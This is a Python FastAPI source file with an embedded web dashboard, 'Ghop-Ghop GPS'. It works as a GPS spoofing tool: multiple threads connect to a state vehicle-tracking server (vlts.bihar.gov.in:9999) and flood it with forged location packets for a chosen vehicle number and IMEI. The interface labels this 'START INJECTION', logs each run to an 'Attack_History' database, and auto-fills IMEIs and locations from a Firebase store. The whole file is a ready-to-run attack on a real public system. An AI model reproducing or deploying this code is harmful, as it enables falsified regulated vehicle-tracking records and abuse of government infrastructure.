import socket, threading, time, requests, json, asyncio
from datetime import datetime, timedelta, timezone
from fastapi import FastAPI, BackgroundTasks
from fastapi.responses import HTMLResponse
import httpx 

app = FastAPI()

# --- 🚀 CONFIG & THREAD-SAFE STATE ---
DB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com"
stop_event = threading.Event() # 🛑 Thread-safe control
stop_event.set() # Initially stopped
total_sent = 0
lock = threading.Lock() 
TAGS = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA", "GRL"]

# --- 🏎️ TURBO ENGINE (STRICT THREAD-SAFE) ---
def handshake_worker(tag, imei, vno, lat, lon):
    global total_sent
    while not stop_event.is_set():
        try:
            # Safe Socket Management
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) 
                s.settimeout(5)
                s.connect(("vlts.bihar.gov.in", 9999))
                
                while not stop_event.is_set():
                    # Batch Burst
                    for _ in range(15):
                        if stop_event.is_set(): break
                        now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
                        dt, tm = now.strftime('%d%m%Y'), now.strftime('%H%M%S')
                        pkt = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{dt},{tm},{lat},N,{lon},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*\\r\\n"
                        
                        s.sendall(bytes(pkt, 'ascii'))
                        with lock:
                            total_sent += 1
                        time.sleep(0.005) 
                    time.sleep(0.05) 
        except Exception as e:
            # Proper error logging for debugging
            print(f"Worker Error [{tag}]: {e}")
            time.sleep(1) 

@app.get("/fetch_data")
async def fetch_data(vno: str):
    v_up = vno.upper().strip()
    async with httpx.AsyncClient() as client:
        try:
            r = await client.get(f"{DB_URL}/Data_Records/{v_up}.json")
            data = r.json()
            if data: return {"found": True, "imei": data.get('IMEI_No',''), "lat": data.get('Lat',''), "lon": data.get('Lon','')}
        except Exception as e: print(f"DB Fetch Error: {e}")
    return {"found": False}

@app.get("/init")
async def init(v:str, i:str, lt:str, ln:str, background_tasks: BackgroundTasks):
    global total_sent
    if stop_event.is_set():
        v_up = v.upper().strip()
        total_sent = 0
        stop_event.clear() # Start firing
        
        now_ist = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
        payload = {"Vehicle_No": v_up, "IMEI_No": i, "Lat": lt, "Lon": ln, "Status": "Active", "Start": now_ist.strftime('%H:%M:%S')}
        background_tasks.add_task(update_db_records, v_up, payload)
        
        for tag in TAGS:
            threading.Thread(target=handshake_worker, args=(tag,i,v_up,lt,ln), daemon=True).start()
    return {"ok": True}

async def update_db_records(vno, payload):
    async with httpx.AsyncClient() as client:
        try: await client.put(f"{DB_URL}/Data_Records/{vno}.json", json=payload)
        except Exception as e: print(f"DB Update Error: {e}")

@app.get("/status")
def status(): return {"c": total_sent, "f": not stop_event.is_set()}

@app.get("/stop")
def stop(): stop_event.set(); return {"ok": True}

# --- 🎨 FINAL UI (MOBILE OPTIMIZED + REFRESH BUG FIX) ---
@app.get("/", response_class=HTMLResponse)
async def home():
    return """
    <html><head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ghop-Ghop GPS</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body { background:#000; color:#0f0; font-family:monospace; margin:0; display:flex; flex-direction:column; align-items:center; min-height:100vh; overflow-x:hidden; }
        .login-box, .dashboard { width:95%; max-width:440px; border:2px solid #0f0; padding:15px; background:rgba(0,10,0,0.95); border-radius:15px; box-shadow: 0 0 25px #0f0; margin-top:20px; box-sizing: border-box; }
        .dashboard { display:none; }
        input { width:100%; background:#000; border:1px solid #333; color:#0f0; padding:12px; margin-top:10px; outline:none; text-transform:uppercase; font-size:16px; box-sizing: border-box; border-radius:5px; }
        button { width:100%; padding:14px; margin-top:10px; cursor:pointer; border:1px solid #0f0; background:transparent; color:#0f0; font-weight:bold; font-size:14px; transition: 0.3s; border-radius:5px; }
        button:active { background:#0f0; color:#000; }
        .audit-box { display:flex; justify-content:space-between; background:rgba(0,40,0,0.5); border:1px solid #0f0; padding:8px; margin-top:10px; border-radius:5px; font-size:10px; color:#fff; text-align:center; }
        .audit-box div { flex:1; border-right:1px solid #030; }
        .audit-box div:last-child { border-right:none; }
        .audit-box b { display:block; color:#0f0; font-size:14px; }
        .user-wall { background:#001a00; border:1px solid #0f0; padding:10px; margin-top:10px; font-size:13px; display:none; color:#fff; border-radius:5px; width:100%; box-sizing: border-box; }
        .wall-msg { color:red; font-weight:bold; }
        #map { width:100%; height:250px; margin-top:15px; border:1px solid #0f0; border-radius:10px; background:#111; }
        .nav { width:95%; max-width:440px; display:flex; justify-content:space-between; font-size:12px; margin-top:10px; color:#fff; }
        .chk-group { display:flex; align-items:center; justify-content:center; gap:10px; margin-top:15px; font-size:13px; width:100%; }
        #overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:2000; justify-content:center; align-items:center; }
        .popup { width:90%; max-width:350px; border:2px solid #ff0; padding:20px; background:#111; color:#fff; text-align:center; border-radius:15px; box-shadow: 0 0 30px #ff0; box-sizing: border-box; }
    </style></head><body>

    <div id="overlay"><div class="popup"><h3>📢 SYSTEM ALERT</h3><p id="bc_text"></p><button onclick="closeBC()" style="background:#ff0;color:#000;border:none;padding:10px;width:100%;font-weight:bold;">UNDERSTOOD</button></div></div>

    <div class="login-box" id="loginScreen">
        <h1 style="text-align:center;font-size:24px;letter-spacing:5px;">Ghop-Ghop GPS</h1>
        <input type="text" id="m_num" placeholder="MOBILE NUMBER">
        <input type="password" id="m_pass" placeholder="PASSWORD">
        <div class="chk-group"><input type="checkbox" id="rem"> <label for="rem">Remember Me</label></div>
        <button onclick="login()" style="background:#0f0;color:#000;border:none;margin-top:20px;">ACCESS SYSTEM</button>
    </div>

    <div class="nav" id="dashNav" style="display:none;"><span>USER: <b id="u_name" style="color:#0f0"></b></span><span onclick="logout()" style="color:red;cursor:pointer;font-weight:bold;">[ LOGOUT ]</span></div>
    
    <div class="dashboard" id="dashScreen">
        <div class="audit-box">
            <div>OK<b id="a_ok">0</b></div><div>FAIL<b id="a_fail">0</b></div><div>ERROR<b id="a_err">0</b></div><div>TOTAL<b id="a_total">0</b></div>
        </div>
        <div class="user-wall" id="u_wall"></div>
        <input type="text" id="v" onblur="smartFetch()" placeholder="VEHICLE NUMBER">
        <input type="text" id="i" placeholder="IMEI">
        <div class="chk-group"><input type="checkbox" id="useDef" checked> <label for="useDef">Use Default Location (Profile)</label></div>
        <div style="display:flex;gap:5px;margin-top:10px;"><input type="text" id="lt" placeholder="LAT"><input type="text" id="ln" placeholder="LON"></div>
        <button onclick="getLocation()">[ GET CURRENT LOCATION ]</button>
        <button onclick="st()" id="startBtn" style="background:#0f0;color:#000;font-size:18px;border:none;">START INJECTION</button>
        <button onclick="sp()" style="color:red;border-color:red;">ABORT</button>
        <button onclick="resetInputs()" style="color:yellow;border-color:yellow;font-size:11px;">RESET SYSTEM</button>
        <div id="map"></div>
        <div style="display:flex;justify-content:space-between;margin-top:15px;font-size:14px;">
            <span>SENT: <b id="c">0</b></span><span id="st_text" style="color:lime">IDLE</span>
        </div>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        const DB = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com";
        let map, marker, curUser = null, currentBCID = "", mon = null;

        function initMap() {
            if (map) return;
            map = L.map('map').setView([20.59, 78.96], 5);
            L.tileLayer('https://{s}.tile.openstreetmap.fr/hot/{z}/{x}/{y}.png').addTo(map);
            marker = L.marker([20.59, 78.96]).addTo(map);
        }

        async function login() {
            let n = document.getElementById('m_num').value.trim(), p = document.getElementById('m_pass').value.trim();
            let res = await fetch(`${DB}/users/${n}.json`), data = await res.json();
            if(data && data.password == p) {
                curUser = { ...data, mobile: n };
                if(document.getElementById('rem').checked) localStorage.setItem('nitro_user', JSON.stringify(curUser));
                showDash();
            } else alert("WRONG PASSWORD");
        }

        window.onload = () => { let s = localStorage.getItem('nitro_user'); if(s){ curUser = JSON.parse(s); showDash(); } }

        function showDash() {
            document.getElementById('loginScreen').style.display='none'; document.getElementById('dashScreen').style.display='block';
            document.getElementById('dashNav').style.display='flex'; document.getElementById('u_name').innerText=curUser.mobile;
            initMap();
            fetch(`${DB}/app_config/broadcast.json`).then(r=>r.json()).then(bc=>{
                if(bc && bc.id !== localStorage.getItem('last_bc_id')){
                    currentBCID=bc.id; document.getElementById('bc_text').innerText=bc.text; document.getElementById('overlay').style.display='flex';
                }
            });
            let today = new Date().toISOString().split('T')[0];
            fetch(`${DB}/User_Audit/${today}/${curUser.mobile}.json`).then(r=>r.json()).then(ad=>{
                if(ad){ document.getElementById('a_ok').innerText=ad.ok||0; document.getElementById('a_total').innerText=ad.total||0; }
            });
            fetch(`${DB}/user_messages/${curUser.mobile}.json`).then(r=>r.json()).then(m=>{
                if(m&&m.text){ let w=document.getElementById('u_wall'); w.innerHTML=`● <b>ADMIN UPDATE:</b><br><span class="wall-msg">${m.text}</span>`; w.style.display='block'; }
            });
        }

        function closeBC() { localStorage.setItem('last_bc_id', currentBCID); document.getElementById('overlay').style.display='none'; }
        
        function smartFetch() {
            let v = document.getElementById('v').value.toUpperCase().trim();
            fetch(`/fetch_data?vno=${v}`).then(r=>r.json()).then(d=>{
                if(d.found){
                    document.getElementById('i').value=d.imei;
                    document.getElementById('lt').value=document.getElementById('useDef').checked ? curUser.lat : d.lat;
                    document.getElementById('ln').value=document.getElementById('useDef').checked ? curUser.lon : d.lon;
                    let lt=document.getElementById('lt').value, ln=document.getElementById('ln').value;
                    map.setView([lt,ln], 14); marker.setLatLng([lt,ln]);
                }
            });
        }

        function getLocation() {
            navigator.geolocation.getCurrentPosition(p=>{
                const lat = p.coords.latitude.toFixed(6), lon = p.coords.longitude.toFixed(6);
                document.getElementById('lt').value = lat; document.getElementById('ln').value = lon;
                map.setView([lat, lon], 14); marker.setLatLng([lat, lon]);
            }, (e) => alert("Allow location access."), {enableHighAccuracy:true});
        }

        function st() {
            // FIX: Clear existing interval before starting new one
            if(mon) clearInterval(mon);
            let v=document.getElementById('v').value, i=document.getElementById('i').value, lt=document.getElementById('lt').value, ln=document.getElementById('ln').value;
            fetch(`/init?v=${v}&i=${i}&lt=${lt}&ln=${ln}`);
            document.getElementById('st_text').innerText="FIRING";
            mon = setInterval(()=>{ fetch('/status').then(r=>r.json()).then(d=>document.getElementById('c').innerText=d.c); }, 1000);
        }

        async function sp() {
            fetch('/stop'); if(mon) clearInterval(mon); mon = null;
            let total = document.getElementById('c').innerText, v_no = document.getElementById('v').value.toUpperCase().trim();
            if(parseInt(total)>0 && v_no !== ""){
                let ist = new Date(new Date().getTime() + (5.5 * 60 * 60 * 1000));
                let rec = { Vehicle_No: v_no, IMEI_No: document.getElementById('i').value, total_sent: total, time: ist.toTimeString().split(' ')[0], Status: "Completed" };
                await fetch(`${DB}/Attack_History/${ist.toISOString().split('T')[0]}/${curUser.mobile}/${v_no}.json`, { method: 'PUT', body: JSON.stringify(rec) });
            }
            document.getElementById('st_text').innerText="IDLE";
        }

        function resetInputs() {
            document.getElementById('v').value=''; document.getElementById('i').value=''; document.getElementById('lt').value=''; document.getElementById('ln').value='';
            document.getElementById('c').innerText='0'; document.getElementById('st_text').innerText='IDLE';
            map.setView([20.59, 78.96], 5); marker.setLatLng([20.59, 78.96]);
        }

        function logout() { localStorage.removeItem('nitro_user'); location.reload(); }
    </script></body></html>
    """
